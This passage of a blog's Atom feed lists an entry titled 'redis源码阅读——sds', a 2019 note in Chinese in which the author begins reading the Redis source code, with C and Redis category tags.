      <category term="C" scheme="https://prontosil.club/tags/C/"/>
    
      <category term="redis" scheme="https://prontosil.club/tags/redis/"/>
    
      <category term="dict" scheme="https://prontosil.club/tags/dict/"/>
    
  </entry>
  
  <entry>
    <title>redis源码阅读——sds</title>
    <link href="https://prontosil.club/2019/07/30/redis%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E2%80%94%E2%80%94sds/"/>
    <id>https://prontosil.club/2019/07/30/redis源码阅读——sds/</id>
    <published>2019-07-30T15:27:03.000Z</published>
    <updated>2019-07-30T16:02:26.090Z</updated>
    
    <content type="html"><![CDATA[<h2>从redis源码开始</h2><p>都说写代码是在表达自己，阅读代码是在理解别人，尤其是阅读高质量的源代码，于是便从头开始读起了redis的源码</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2&gt;从redis源码开始&lt;/h2&gt;
&lt;p&gt;都说写代码是在表达自己，阅读代码是在理解别人，尤其是阅读高质量的源代码，于是便从头开始读起了redis的源码&lt;/p&gt;

      
    
    </summary>
    
      <category term="note" scheme="https://prontosil.club/categories/note/"/>
    
    
      <category term="C" scheme="https://prontosil.club/tags/C/"/>
    
      <category term="redis" scheme="https://prontosil.club/tags/redis/"/>
    
      <category term="sds" scheme="https://prontosil.club/tags/sds/"/>
    
  </entry>
  
</feed>
